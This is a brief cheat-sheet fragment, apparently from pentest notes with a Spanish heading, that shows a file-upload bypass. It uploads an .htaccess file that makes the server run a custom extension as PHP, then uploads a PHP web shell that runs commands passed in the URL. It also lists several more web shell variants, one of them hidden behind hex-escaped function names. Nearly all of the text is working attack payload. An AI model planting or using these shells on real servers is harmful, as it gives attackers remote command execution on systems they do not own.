-- -
1. Content-Disposition: form-data; name="fileToUpload"; filename=".htaccess" 
    Content-Type: text/plain
    AddType application/x-httpd-php .test 
2. 
	Content-Disposition: form-data; name="fileToUpload"; filename="cmd.test" 
	Content-Type: application/x-php
	
	<?php
		system($_GET['cmd']);
	?>
**Otro tipo de webshells en php:**

```php
<?=`$_GET[0]`?>

<?php
	$c=$_GET['cmd'];
	 echo `$c`;
?>

<?php
	"system"("id");
?>

<?php
	"\x73\x79\x73\x74\x65\x6d"($_GET['cmd']);
?>
```